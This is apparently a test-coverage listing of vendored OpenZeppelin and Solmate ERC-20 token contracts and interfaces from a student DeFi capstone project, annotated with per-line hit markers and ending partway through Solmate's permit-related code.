/home/chase/Documents/RIT/RIT_2025/capstone/defi_capstone/lib/openzeppelin-contracts/contracts/interfaces/draft-IERC6093.sol
   1 |     | // SPDX-License-Identifier: MIT
   2 |     | // OpenZeppelin Contracts (last updated v5.4.0) (interfaces/draft-IERC6093.sol)
   3 |     | pragma solidity >=0.8.4;
   4 |     | 
   5 |     | /**
   6 |     |  * @dev Standard ERC-20 Errors
   7 |     |  * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC-20 tokens.
   8 |     |  */
   9 |     | interface IERC20Errors {
  10 |     |     /**
  11 |     |      * @dev Indicates an error related to the current `balance` of a `sender`. Used in transfers.
  12 |     |      * @param sender Address whose tokens are being transferred.
  13 |     |      * @param balance Current balance for the interacting account.
  14 |     |      * @param needed Minimum amount required to perform a transfer.
  15 |     |      */
  16 |     |     error ERC20InsufficientBalance(address sender, uint256 balance, uint256 needed);
  17 |     | 
  18 |     |     /**
  19 |     |      * @dev Indicates a failure with the token `sender`. Used in transfers.
  20 |     |      * @param sender Address whose tokens are being transferred.
  21 |     |      */
  22 |     |     error ERC20InvalidSender(address sender);
  23 |     | 
  24 |     |     /**
  25 |     |      * @dev Indicates a failure with the token `receiver`. Used in transfers.
  26 |     |      * @param receiver Address to which tokens are being transferred.
  27 |     |      */
  28 |     |     error ERC20InvalidReceiver(address receiver);
  29 |     | 
  30 |     |     /**
  31 |     |      * @dev Indicates a failure with the `spender`’s `allowance`. Used in transfers.
  32 |     |      * @param spender Address that may be allowed to operate on tokens without being their owner.
  33 |     |      * @param allowance Amount of tokens a `spender` is allowed to operate with.
  34 |     |      * @param needed Minimum amount required to perform a transfer.
  35 |     |      */
  36 |     |     error ERC20InsufficientAllowance(address spender, uint256 allowance, uint256 needed);
  37 |     | 
  38 |     |     /**
  39 |     |      * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.
  40 |     |      * @param approver Address initiating an approval operation.
  41 |     |      */
  42 |     |     error ERC20InvalidApprover(address approver);
  43 |     | 
  44 |     |     /**
  45 |     |      * @dev Indicates a failure with the `spender` to be approved. Used in approvals.
  46 |     |      * @param spender Address that may be allowed to operate on tokens without being their owner.
  47 |     |      */
  48 |     |     error ERC20InvalidSpender(address spender);
  49 |     | }
  50 |     | 
  51 |     | /**
  52 |     |  * @dev Standard ERC-721 Errors
  53 |     |  * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC-721 tokens.
  54 |     |  */
  55 |     | interface IERC721Errors {
  56 |     |     /**
  57 |     |      * @dev Indicates that an address can't be an owner. For example, `address(0)` is a forbidden owner in ERC-20.
  58 |     |      * Used in balance queries.
  59 |     |      * @param owner Address of the current owner of a token.
  60 |     |      */
  61 |     |     error ERC721InvalidOwner(address owner);
  62 |     | 
  63 |     |     /**
  64 |     |      * @dev Indicates a `tokenId` whose `owner` is the zero address.
  65 |     |      * @param tokenId Identifier number of a token.
  66 |     |      */
  67 |     |     error ERC721NonexistentToken(uint256 tokenId);
  68 |     | 
  69 |     |     /**
  70 |     |      * @dev Indicates an error related to the ownership over a particular token. Used in transfers.
  71 |     |      * @param sender Address whose tokens are being transferred.
  72 |     |      * @param tokenId Identifier number of a token.
  73 |     |      * @param owner Address of the current owner of a token.
  74 |     |      */
  75 |     |     error ERC721IncorrectOwner(address sender, uint256 tokenId, address owner);
  76 |     | 
  77 |     |     /**
  78 |     |      * @dev Indicates a failure with the token `sender`. Used in transfers.
  79 |     |      * @param sender Address whose tokens are being transferred.
  80 |     |      */
  81 |     |     error ERC721InvalidSender(address sender);
  82 |     | 
  83 |     |     /**
  84 |     |      * @dev Indicates a failure with the token `receiver`. Used in transfers.
  85 |     |      * @param receiver Address to which tokens are being transferred.
  86 |     |      */
  87 |     |     error ERC721InvalidReceiver(address receiver);
  88 |     | 
  89 |     |     /**
  90 |     |      * @dev Indicates a failure with the `operator`’s approval. Used in transfers.
  91 |     |      * @param operator Address that may be allowed to operate on tokens without being their owner.
  92 |     |      * @param tokenId Identifier number of a token.
  93 |     |      */
  94 |     |     error ERC721InsufficientApproval(address operator, uint256 tokenId);
  95 |     | 
  96 |     |     /**
  97 |     |      * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.
  98 |     |      * @param approver Address initiating an approval operation.
  99 |     |      */
 100 |     |     error ERC721InvalidApprover(address approver);
 101 |     | 
 102 |     |     /**
 103 |     |      * @dev Indicates a failure with the `operator` to be approved. Used in approvals.
 104 |     |      * @param operator Address that may be allowed to operate on tokens without being their owner.
 105 |     |      */
 106 |     |     error ERC721InvalidOperator(address operator);
 107 |     | }
 108 |     | 
 109 |     | /**
 110 |     |  * @dev Standard ERC-1155 Errors
 111 |     |  * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC-1155 tokens.
 112 |     |  */
 113 |     | interface IERC1155Errors {
 114 |     |     /**
 115 |     |      * @dev Indicates an error related to the current `balance` of a `sender`. Used in transfers.
 116 |     |      * @param sender Address whose tokens are being transferred.
 117 |     |      * @param balance Current balance for the interacting account.
 118 |     |      * @param needed Minimum amount required to perform a transfer.
 119 |     |      * @param tokenId Identifier number of a token.
 120 |     |      */
 121 |     |     error ERC1155InsufficientBalance(address sender, uint256 balance, uint256 needed, uint256 tokenId);
 122 |     | 
 123 |     |     /**
 124 |     |      * @dev Indicates a failure with the token `sender`. Used in transfers.
 125 |     |      * @param sender Address whose tokens are being transferred.
 126 |     |      */
 127 |     |     error ERC1155InvalidSender(address sender);
 128 |     | 
 129 |     |     /**
 130 |     |      * @dev Indicates a failure with the token `receiver`. Used in transfers.
 131 |     |      * @param receiver Address to which tokens are being transferred.
 132 |     |      */
 133 |     |     error ERC1155InvalidReceiver(address receiver);
 134 |     | 
 135 |     |     /**
 136 |     |      * @dev Indicates a failure with the `operator`’s approval. Used in transfers.
 137 |     |      * @param operator Address that may be allowed to operate on tokens without being their owner.
 138 |     |      * @param owner Address of the current owner of a token.
 139 |     |      */
 140 |     |     error ERC1155MissingApprovalForAll(address operator, address owner);
 141 |     | 
 142 |     |     /**
 143 |     |      * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.
 144 |     |      * @param approver Address initiating an approval operation.
 145 |     |      */
 146 |     |     error ERC1155InvalidApprover(address approver);
 147 |     | 
 148 |     |     /**
 149 |     |      * @dev Indicates a failure with the `operator` to be approved. Used in approvals.
 150 |     |      * @param operator Address that may be allowed to operate on tokens without being their owner.
 151 |     |      */
 152 |     |     error ERC1155InvalidOperator(address operator);
 153 |     | 
 154 |     |     /**
 155 |     |      * @dev Indicates an array length mismatch between ids and values in a safeBatchTransferFrom operation.
 156 |     |      * Used in batch transfers.
 157 |     |      * @param idsLength Length of the array of token identifiers
 158 |     |      * @param valuesLength Length of the array of token amounts
 159 |     |      */
 160 |     |     error ERC1155InvalidArrayLength(uint256 idsLength, uint256 valuesLength);
 161 |     | }
 162 |     | 

/home/chase/Documents/RIT/RIT_2025/capstone/defi_capstone/lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol
   1 |     | // SPDX-License-Identifier: MIT
   2 |     | // OpenZeppelin Contracts (last updated v5.4.0) (token/ERC20/ERC20.sol)
   3 |     | 
   4 |     | pragma solidity ^0.8.20;
   5 |     | 
   6 |     | import {IERC20} from "./IERC20.sol";
   7 |     | import {IERC20Metadata} from "./extensions/IERC20Metadata.sol";
   8 |     | import {Context} from "../../utils/Context.sol";
   9 |     | import {IERC20Errors} from "../../interfaces/draft-IERC6093.sol";
  10 |     | 
  11 |     | /**
  12 |     |  * @dev Implementation of the {IERC20} interface.
  13 |     |  *
  14 |     |  * This implementation is agnostic to the way tokens are created. This means
  15 |     |  * that a supply mechanism has to be added in a derived contract using {_mint}.
  16 |     |  *
  17 |     |  * TIP: For a detailed writeup see our guide
  18 |     |  * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How
  19 |     |  * to implement supply mechanisms].
  20 |     |  *
  21 |     |  * The default value of {decimals} is 18. To change this, you should override
  22 |     |  * this function so it returns a different value.
  23 |     |  *
  24 |     |  * We have followed general OpenZeppelin Contracts guidelines: functions revert
  25 |     |  * instead returning `false` on failure. This behavior is nonetheless
  26 |     |  * conventional and does not conflict with the expectations of ERC-20
  27 |     |  * applications.
  28 |     |  */
  29 |     | abstract contract ERC20 is Context, IERC20, IERC20Metadata, IERC20Errors {
  30 |     |     mapping(address account => uint256) private _balances;
  31 |     | 
  32 |     |     mapping(address account => mapping(address spender => uint256)) private _allowances;
  33 |     | 
  34 |     |     uint256 private _totalSupply;
  35 |     | 
  36 |     |     string private _name;
  37 |     |     string private _symbol;
  38 |     | 
  39 |     |     /**
  40 |     |      * @dev Sets the values for {name} and {symbol}.
  41 |     |      *
  42 |     |      * Both values are immutable: they can only be set once during construction.
  43 |     |      */
  44 | *   |     constructor(string memory name_, string memory symbol_) {
  45 | *   |         _name = name_;
  46 | *   |         _symbol = symbol_;
  47 |     |     }
  48 |     | 
  49 |     |     /**
  50 |     |      * @dev Returns the name of the token.
  51 |     |      */
  52 | *   |     function name() public view virtual returns (string memory) {
  53 | *   |         return _name;
  54 |     |     }
  55 |     | 
  56 |     |     /**
  57 |     |      * @dev Returns the symbol of the token, usually a shorter version of the
  58 |     |      * name.
  59 |     |      */
  60 | *   |     function symbol() public view virtual returns (string memory) {
  61 | *   |         return _symbol;
  62 |     |     }
  63 |     | 
  64 |     |     /**
  65 |     |      * @dev Returns the number of decimals used to get its user representation.
  66 |     |      * For example, if `decimals` equals `2`, a balance of `505` tokens should
  67 |     |      * be displayed to a user as `5.05` (`505 / 10 ** 2`).
  68 |     |      *
  69 |     |      * Tokens usually opt for a value of 18, imitating the relationship between
  70 |     |      * Ether and Wei. This is the default value returned by this function, unless
  71 |     |      * it's overridden.
  72 |     |      *
  73 |     |      * NOTE: This information is only used for _display_ purposes: it in
  74 |     |      * no way affects any of the arithmetic of the contract, including
  75 |     |      * {IERC20-balanceOf} and {IERC20-transfer}.
  76 |     |      */
  77 | *   |     function decimals() public view virtual returns (uint8) {
  78 | *   |         return 18;
  79 |     |     }
  80 |     | 
  81 |     |     /// @inheritdoc IERC20
  82 | *   |     function totalSupply() public view virtual returns (uint256) {
  83 | *   |         return _totalSupply;
  84 |     |     }
  85 |     | 
  86 |     |     /// @inheritdoc IERC20
  87 | *   |     function balanceOf(address account) public view virtual returns (uint256) {
  88 | *   |         return _balances[account];
  89 |     |     }
  90 |     | 
  91 |     |     /**
  92 |     |      * @dev See {IERC20-transfer}.
  93 |     |      *
  94 |     |      * Requirements:
  95 |     |      *
  96 |     |      * - `to` cannot be the zero address.
  97 |     |      * - the caller must have a balance of at least `value`.
  98 |     |      */
  99 | *   |     function transfer(address to, uint256 value) public virtual returns (bool) {
 100 | *   |         address owner = _msgSender();
 101 | *   |         _transfer(owner, to, value);
 102 | *   |         return true;
 103 |     |     }
 104 |     | 
 105 |     |     /// @inheritdoc IERC20
 106 | *   |     function allowance(address owner, address spender) public view virtual returns (uint256) {
 107 | *   |         return _allowances[owner][spender];
 108 |     |     }
 109 |     | 
 110 |     |     /**
 111 |     |      * @dev See {IERC20-approve}.
 112 |     |      *
 113 |     |      * NOTE: If `value` is the maximum `uint256`, the allowance is not updated on
 114 |     |      * `transferFrom`. This is semantically equivalent to an infinite approval.
 115 |     |      *
 116 |     |      * Requirements:
 117 |     |      *
 118 |     |      * - `spender` cannot be the zero address.
 119 |     |      */
 120 | *   |     function approve(address spender, uint256 value) public virtual returns (bool) {
 121 | *   |         address owner = _msgSender();
 122 | *   |         _approve(owner, spender, value);
 123 | *   |         return true;
 124 |     |     }
 125 |     | 
 126 |     |     /**
 127 |     |      * @dev See {IERC20-transferFrom}.
 128 |     |      *
 129 |     |      * Skips emitting an {Approval} event indicating an allowance update. This is not
 130 |     |      * required by the ERC. See {xref-ERC20-_approve-address-address-uint256-bool-}[_approve].
 131 |     |      *
 132 |     |      * NOTE: Does not update the allowance if the current allowance
 133 |     |      * is the maximum `uint256`.
 134 |     |      *
 135 |     |      * Requirements:
 136 |     |      *
 137 |     |      * - `from` and `to` cannot be the zero address.
 138 |     |      * - `from` must have a balance of at least `value`.
 139 |     |      * - the caller must have allowance for ``from``'s tokens of at least
 140 |     |      * `value`.
 141 |     |      */
 142 | *   |     function transferFrom(address from, address to, uint256 value) public virtual returns (bool) {
 143 | *   |         address spender = _msgSender();
 144 | *   |         _spendAllowance(from, spender, value);
 145 | *   |         _transfer(from, to, value);
 146 | *   |         return true;
 147 |     |     }
 148 |     | 
 149 |     |     /**
 150 |     |      * @dev Moves a `value` amount of tokens from `from` to `to`.
 151 |     |      *
 152 |     |      * This internal function is equivalent to {transfer}, and can be used to
 153 |     |      * e.g. implement automatic token fees, slashing mechanisms, etc.
 154 |     |      *
 155 |     |      * Emits a {Transfer} event.
 156 |     |      *
 157 |     |      * NOTE: This function is not virtual, {_update} should be overridden instead.
 158 |     |      */
 159 | *   |     function _transfer(address from, address to, uint256 value) internal {
 160 | *   |         if (from == address(0)) {
 161 |     |             revert ERC20InvalidSender(address(0));
 162 |     |         }
 163 | *   |         if (to == address(0)) {
 164 | *r  |             revert ERC20InvalidReceiver(address(0));
 165 |     |         }
 166 | *   |         _update(from, to, value);
 167 |     |     }
 168 |     | 
 169 |     |     /**
 170 |     |      * @dev Transfers a `value` amount of tokens from `from` to `to`, or alternatively mints (or burns) if `from`
 171 |     |      * (or `to`) is the zero address. All customizations to transfers, mints, and burns should be done by overriding
 172 |     |      * this function.
 173 |     |      *
 174 |     |      * Emits a {Transfer} event.
 175 |     |      */
 176 | *   |     function _update(address from, address to, uint256 value) internal virtual {
 177 | *   |         if (from == address(0)) {
 178 |     |             // Overflow check required: The rest of the code assumes that totalSupply never overflows
 179 | *   |             _totalSupply += value;
 180 | *   |         } else {
 181 | *   |             uint256 fromBalance = _balances[from];
 182 | *   |             if (fromBalance < value) {
 183 | *r  |                 revert ERC20InsufficientBalance(from, fromBalance, value);
 184 |     |             }
 185 |     |             unchecked {
 186 |     |                 // Overflow not possible: value <= fromBalance <= totalSupply.
 187 | *   |                 _balances[from] = fromBalance - value;
 188 |     |             }
 189 |     |         }
 190 |     | 
 191 | *   |         if (to == address(0)) {
 192 |     |             unchecked {
 193 |     |                 // Overflow not possible: value <= totalSupply or value <= fromBalance <= totalSupply.
 194 |     |                 _totalSupply -= value;
 195 |     |             }
 196 |     |         } else {
 197 |     |             unchecked {
 198 |     |                 // Overflow not possible: balance + value is at most totalSupply, which we know fits into a uint256.
 199 | *   |                 _balances[to] += value;
 200 |     |             }
 201 |     |         }
 202 |     | 
 203 | *   |         emit Transfer(from, to, value);
 204 |     |     }
 205 |     | 
 206 |     |     /**
 207 |     |      * @dev Creates a `value` amount of tokens and assigns them to `account`, by transferring it from address(0).
 208 |     |      * Relies on the `_update` mechanism
 209 |     |      *
 210 |     |      * Emits a {Transfer} event with `from` set to the zero address.
 211 |     |      *
 212 |     |      * NOTE: This function is not virtual, {_update} should be overridden instead.
 213 |     |      */
 214 | *   |     function _mint(address account, uint256 value) internal {
 215 | *   |         if (account == address(0)) {
 216 |     |             revert ERC20InvalidReceiver(address(0));
 217 |     |         }
 218 | *   |         _update(address(0), account, value);
 219 |     |     }
 220 |     | 
 221 |     |     /**
 222 |     |      * @dev Destroys a `value` amount of tokens from `account`, lowering the total supply.
 223 |     |      * Relies on the `_update` mechanism.
 224 |     |      *
 225 |     |      * Emits a {Transfer} event with `to` set to the zero address.
 226 |     |      *
 227 |     |      * NOTE: This function is not virtual, {_update} should be overridden instead
 228 |     |      */
 229 |     |     function _burn(address account, uint256 value) internal {
 230 |     |         if (account == address(0)) {
 231 |     |             revert ERC20InvalidSender(address(0));
 232 |     |         }
 233 |     |         _update(account, address(0), value);
 234 |     |     }
 235 |     | 
 236 |     |     /**
 237 |     |      * @dev Sets `value` as the allowance of `spender` over the `owner`'s tokens.
 238 |     |      *
 239 |     |      * This internal function is equivalent to `approve`, and can be used to
 240 |     |      * e.g. set automatic allowances for certain subsystems, etc.
 241 |     |      *
 242 |     |      * Emits an {Approval} event.
 243 |     |      *
 244 |     |      * Requirements:
 245 |     |      *
 246 |     |      * - `owner` cannot be the zero address.
 247 |     |      * - `spender` cannot be the zero address.
 248 |     |      *
 249 |     |      * Overrides to this logic should be done to the variant with an additional `bool emitEvent` argument.
 250 |     |      */
 251 | *   |     function _approve(address owner, address spender, uint256 value) internal {
 252 | *   |         _approve(owner, spender, value, true);
 253 |     |     }
 254 |     | 
 255 |     |     /**
 256 |     |      * @dev Variant of {_approve} with an optional flag to enable or disable the {Approval} event.
 257 |     |      *
 258 |     |      * By default (when calling {_approve}) the flag is set to true. On the other hand, approval changes made by
 259 |     |      * `_spendAllowance` during the `transferFrom` operation set the flag to false. This saves gas by not emitting any
 260 |     |      * `Approval` event during `transferFrom` operations.
 261 |     |      *
 262 |     |      * Anyone who wishes to continue emitting `Approval` events on the`transferFrom` operation can force the flag to
 263 |     |      * true using the following override:
 264 |     |      *
 265 |     |      * ```solidity
 266 |     |      * function _approve(address owner, address spender, uint256 value, bool) internal virtual override {
 267 |     |      *     super._approve(owner, spender, value, true);
 268 |     |      * }
 269 |     |      * ```
 270 |     |      *
 271 |     |      * Requirements are the same as {_approve}.
 272 |     |      */
 273 | *   |     function _approve(address owner, address spender, uint256 value, bool emitEvent) internal virtual {
 274 | *   |         if (owner == address(0)) {
 275 |     |             revert ERC20InvalidApprover(address(0));
 276 |     |         }
 277 | *   |         if (spender == address(0)) {
 278 | *r  |             revert ERC20InvalidSpender(address(0));
 279 |     |         }
 280 | *   |         _allowances[owner][spender] = value;
 281 | *   |         if (emitEvent) {
 282 | *   |             emit Approval(owner, spender, value);
 283 |     |         }
 284 |     |     }
 285 |     | 
 286 |     |     /**
 287 |     |      * @dev Updates `owner`'s allowance for `spender` based on spent `value`.
 288 |     |      *
 289 |     |      * Does not update the allowance value in case of infinite allowance.
 290 |     |      * Revert if not enough allowance is available.
 291 |     |      *
 292 |     |      * Does not emit an {Approval} event.
 293 |     |      */
 294 | *   |     function _spendAllowance(address owner, address spender, uint256 value) internal virtual {
 295 | *   |         uint256 currentAllowance = allowance(owner, spender);
 296 | *   |         if (currentAllowance < type(uint256).max) {
 297 | *   |             if (currentAllowance < value) {
 298 | *r  |                 revert ERC20InsufficientAllowance(spender, currentAllowance, value);
 299 |     |             }
 300 |     |             unchecked {
 301 | *   |                 _approve(owner, spender, currentAllowance - value, false);
 302 |     |             }
 303 |     |         }
 304 |     |     }
 305 |     | }
 306 |     | 

/home/chase/Documents/RIT/RIT_2025/capstone/defi_capstone/lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol
  1 |     | // SPDX-License-Identifier: MIT
  2 |     | // OpenZeppelin Contracts (last updated v5.4.0) (token/ERC20/IERC20.sol)
  3 |     | 
  4 |     | pragma solidity >=0.4.16;
  5 |     | 
  6 |     | /**
  7 |     |  * @dev Interface of the ERC-20 standard as defined in the ERC.
  8 |     |  */
  9 |     | interface IERC20 {
 10 |     |     /**
 11 |     |      * @dev Emitted when `value` tokens are moved from one account (`from`) to
 12 |     |      * another (`to`).
 13 |     |      *
 14 |     |      * Note that `value` may be zero.
 15 |     |      */
 16 |     |     event Transfer(address indexed from, address indexed to, uint256 value);
 17 |     | 
 18 |     |     /**
 19 |     |      * @dev Emitted when the allowance of a `spender` for an `owner` is set by
 20 |     |      * a call to {approve}. `value` is the new allowance.
 21 |     |      */
 22 |     |     event Approval(address indexed owner, address indexed spender, uint256 value);
 23 |     | 
 24 |     |     /**
 25 |     |      * @dev Returns the value of tokens in existence.
 26 |     |      */
 27 |     |     function totalSupply() external view returns (uint256);
 28 |     | 
 29 |     |     /**
 30 |     |      * @dev Returns the value of tokens owned by `account`.
 31 |     |      */
 32 |     |     function balanceOf(address account) external view returns (uint256);
 33 |     | 
 34 |     |     /**
 35 |     |      * @dev Moves a `value` amount of tokens from the caller's account to `to`.
 36 |     |      *
 37 |     |      * Returns a boolean value indicating whether the operation succeeded.
 38 |     |      *
 39 |     |      * Emits a {Transfer} event.
 40 |     |      */
 41 |     |     function transfer(address to, uint256 value) external returns (bool);
 42 |     | 
 43 |     |     /**
 44 |     |      * @dev Returns the remaining number of tokens that `spender` will be
 45 |     |      * allowed to spend on behalf of `owner` through {transferFrom}. This is
 46 |     |      * zero by default.
 47 |     |      *
 48 |     |      * This value changes when {approve} or {transferFrom} are called.
 49 |     |      */
 50 |     |     function allowance(address owner, address spender) external view returns (uint256);
 51 |     | 
 52 |     |     /**
 53 |     |      * @dev Sets a `value` amount of tokens as the allowance of `spender` over the
 54 |     |      * caller's tokens.
 55 |     |      *
 56 |     |      * Returns a boolean value indicating whether the operation succeeded.
 57 |     |      *
 58 |     |      * IMPORTANT: Beware that changing an allowance with this method brings the risk
 59 |     |      * that someone may use both the old and the new allowance by unfortunate
 60 |     |      * transaction ordering. One possible solution to mitigate this race
 61 |     |      * condition is to first reduce the spender's allowance to 0 and set the
 62 |     |      * desired value afterwards:
 63 |     |      * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
 64 |     |      *
 65 |     |      * Emits an {Approval} event.
 66 |     |      */
 67 |     |     function approve(address spender, uint256 value) external returns (bool);
 68 |     | 
 69 |     |     /**
 70 |     |      * @dev Moves a `value` amount of tokens from `from` to `to` using the
 71 |     |      * allowance mechanism. `value` is then deducted from the caller's
 72 |     |      * allowance.
 73 |     |      *
 74 |     |      * Returns a boolean value indicating whether the operation succeeded.
 75 |     |      *
 76 |     |      * Emits a {Transfer} event.
 77 |     |      */
 78 |     |     function transferFrom(address from, address to, uint256 value) external returns (bool);
 79 |     | }
 80 |     | 

/home/chase/Documents/RIT/RIT_2025/capstone/defi_capstone/lib/openzeppelin-contracts/contracts/token/ERC20/extensions/IERC20Metadata.sol
  1 |     | // SPDX-License-Identifier: MIT
  2 |     | // OpenZeppelin Contracts (last updated v5.4.0) (token/ERC20/extensions/IERC20Metadata.sol)
  3 |     | 
  4 |     | pragma solidity >=0.6.2;
  5 |     | 
  6 |     | import {IERC20} from "../IERC20.sol";
  7 |     | 
  8 |     | /**
  9 |     |  * @dev Interface for the optional metadata functions from the ERC-20 standard.
 10 |     |  */
 11 |     | interface IERC20Metadata is IERC20 {
 12 |     |     /**
 13 |     |      * @dev Returns the name of the token.
 14 |     |      */
 15 |     |     function name() external view returns (string memory);
 16 |     | 
 17 |     |     /**
 18 |     |      * @dev Returns the symbol of the token.
 19 |     |      */
 20 |     |     function symbol() external view returns (string memory);
 21 |     | 
 22 |     |     /**
 23 |     |      * @dev Returns the decimals places of the token.
 24 |     |      */
 25 |     |     function decimals() external view returns (uint8);
 26 |     | }
 27 |     | 

/home/chase/Documents/RIT/RIT_2025/capstone/defi_capstone/lib/openzeppelin-contracts/contracts/utils/Context.sol
  1 |     | // SPDX-License-Identifier: MIT
  2 |     | // OpenZeppelin Contracts (last updated v5.0.1) (utils/Context.sol)
  3 |     | 
  4 |     | pragma solidity ^0.8.20;
  5 |     | 
  6 |     | /**
  7 |     |  * @dev Provides information about the current execution context, including the
  8 |     |  * sender of the transaction and its data. While these are generally available
  9 |     |  * via msg.sender and msg.data, they should not be accessed in such a direct
 10 |     |  * manner, since when dealing with meta-transactions the account sending and
 11 |     |  * paying for execution may not be the actual sender (as far as an application
 12 |     |  * is concerned).
 13 |     |  *
 14 |     |  * This contract is only required for intermediate, library-like contracts.
 15 |     |  */
 16 |     | abstract contract Context {
 17 | *   |     function _msgSender() internal view virtual returns (address) {
 18 | *   |         return msg.sender;
 19 |     |     }
 20 |     | 
 21 |     |     function _msgData() internal view virtual returns (bytes calldata) {
 22 |     |         return msg.data;
 23 |     |     }
 24 |     | 
 25 |     |     function _contextSuffixLength() internal view virtual returns (uint256) {
 26 |     |         return 0;
 27 |     |     }
 28 |     | }
 29 |     | 

/home/chase/Documents/RIT/RIT_2025/capstone/defi_capstone/lib/solmate/src/tokens/ERC20.sol
   1 |     | // SPDX-License-Identifier: AGPL-3.0-only
   2 |     | pragma solidity >=0.8.0;
   3 |     | 
   4 |     | /// @notice Modern and gas efficient ERC20 + EIP-2612 implementation.
   5 |     | /// @author Solmate (https://github.com/transmissions11/solmate/blob/main/src/tokens/ERC20.sol)
   6 |     | /// @author Modified from Uniswap (https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/UniswapV2ERC20.sol)
   7 |     | /// @dev Do not manually set balances without updating totalSupply, as the sum of all user balances must not exceed it.
   8 |     | abstract contract ERC20 {
   9 |     |     /*//////////////////////////////////////////////////////////////
  10 |     |                                  EVENTS
  11 |     |     //////////////////////////////////////////////////////////////*/
  12 |     | 
  13 |     |     event Transfer(address indexed from, address indexed to, uint256 amount);
  14 |     | 
  15 |     |     event Approval(address indexed owner, address indexed spender, uint256 amount);
  16 |     | 
  17 |     |     /*//////////////////////////////////////////////////////////////
  18 |     |                             METADATA STORAGE
  19 |     |     //////////////////////////////////////////////////////////////*/
  20 |     | 
  21 |     |     string public name;
  22 |     | 
  23 |     |     string public symbol;
  24 |     | 
  25 |     |     uint8 public immutable decimals;
  26 |     | 
  27 |     |     /*//////////////////////////////////////////////////////////////
  28 |     |                               ERC20 STORAGE
  29 |     |     //////////////////////////////////////////////////////////////*/
  30 |     | 
  31 |     |     uint256 public totalSupply;
  32 |     | 
  33 |     |     mapping(address => uint256) public balanceOf;
  34 |     | 
  35 |     |     mapping(address => mapping(address => uint256)) public allowance;
  36 |     | 
  37 |     |     /*//////////////////////////////////////////////////////////////
  38 |     |                             EIP-2612 STORAGE
  39 |     |     //////////////////////////////////////////////////////////////*/
  40 |     | 
  41 |     |     uint256 internal immutable INITIAL_CHAIN_ID;
  42 |     | 
  43 |     |     bytes32 internal immutable INITIAL_DOMAIN_SEPARATOR;
  44 |     | 
  45 |     |     mapping(address => uint256) public nonces;
  46 |     | 
  47 |     |     /*//////////////////////////////////////////////////////////////
  48 |     |                                CONSTRUCTOR
  49 |     |     //////////////////////////////////////////////////////////////*/
  50 |     | 
  51 |     |     constructor(
  52 |     |         string memory _name,
  53 |     |         string memory _symbol,
  54 |     |         uint8 _decimals
  55 |     |     ) {
  56 |     |         name = _name;
  57 |     |         symbol = _symbol;
  58 |     |         decimals = _decimals;
  59 |     | 
  60 |     |         INITIAL_CHAIN_ID = block.chainid;
  61 |     |         INITIAL_DOMAIN_SEPARATOR = computeDomainSeparator();
  62 |     |     }
  63 |     | 
  64 |     |     /*//////////////////////////////////////////////////////////////
  65 |     |                                ERC20 LOGIC
  66 |     |     //////////////////////////////////////////////////////////////*/
  67 |     | 
  68 |     |     function approve(address spender, uint256 amount) public virtual returns (bool) {
  69 |     |         allowance[msg.sender][spender] = amount;
  70 |     | 
  71 |     |         emit Approval(msg.sender, spender, amount);
  72 |     | 
  73 |     |         return true;
  74 |     |     }
  75 |     | 
  76 |     |     function transfer(address to, uint256 amount) public virtual returns (bool) {
  77 |     |         balanceOf[msg.sender] -= amount;
  78 |     | 
  79 |     |         // Cannot overflow because the sum of all user
  80 |     |         // balances can't exceed the max uint256 value.
  81 |     |         unchecked {
  82 |     |             balanceOf[to] += amount;
  83 |     |         }
  84 |     | 
  85 |     |         emit Transfer(msg.sender, to, amount);
  86 |     | 
  87 |     |         return true;
  88 |     |     }
  89 |     | 
  90 |     |     function transferFrom(
  91 |     |         address from,
  92 |     |         address to,
  93 |     |         uint256 amount
  94 |     |     ) public virtual returns (bool) {
  95 |     |         uint256 allowed = allowance[from][msg.sender]; // Saves gas for limited approvals.
  96 |     | 
  97 |     |         if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
  98 |     | 
  99 |     |         balanceOf[from] -= amount;
 100 |     | 
 101 |     |         // Cannot overflow because the sum of all user
 102 |     |         // balances can't exceed the max uint256 value.
 103 |     |         unchecked {
 104 |     |             balanceOf[to] += amount;
 105 |     |         }
 106 |     | 
 107 |     |         emit Transfer(from, to, amount);
 108 |     | 
 109 |     |         return true;
 110 |     |     }
 111 |     | 
 112 |     |     /*//////////////////////////////////////////////////////////////
 113 |     |                              EIP-2612 LOGIC
 114 |     |     //////////////////////////////////////////////////////////////*/
 115 |     | 
 116 |     |     function permit(
 117 |     |         address owner,
 118 |     |         address spender,
 119 |     |         uint256 value,
 120 |     |         uint256 deadline,
 121 |     |         uint8 v,
 122 |     |         bytes32 r,
 123 |     |         bytes32 s
 124 |     |     ) public virtual {
 125 |     |         require(deadline >= block.timestamp, "PERMIT_DEADLINE_EXPIRED");
 126 |     | 
 127 |     |         // Unchecked because the only math done is incrementing
 128 |     |         // the owner's nonce which cannot realistically overflow.
 129 |     |         unchecked {
 130 |     |             address recoveredAddress = ecrecover(
 131 |     |                 keccak256(
 132 |     |                     abi.encodePacked(
 133 |     |                         "\x19\x01",
 134 |     |                         DOMAIN_SEPARATOR(),
 135 |     |                         keccak256(
 136 |     |                             abi.encode(
 137 |     |                                 keccak256(
 138 |     |                                     "Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)"
 139 |     |                                 ),
 140 |     |                                 owner,
 141 |     |                                 spender,
 142 |     |                                 value,
 143 |     |                                 nonces[owner]++,
 144 |     |                                 deadline
 145 |     |                             )
 146 |     |                         )
 147 |     |                     )
 148 |     |                 ),
 149 |     |                 v,
 150 |     |                 r,
 151 |     |                 s
 152 |     |             );
 153 |     | 
 154 |     |             require(recoveredAddress != address(0) && recoveredAddress == owner, "INVALID_SIGNER");
 155 |     | 
 156 |     |             allowance[recoveredAddress][spender] = value;
 157 |     |         }
 158 |     | 
 159 |     |         emit Approval(owner, spender, value);
 160 |     |     }
 161 |     | 
 162 |     |     function DOMAIN_SEPARATOR() public view virtual returns (bytes32) {
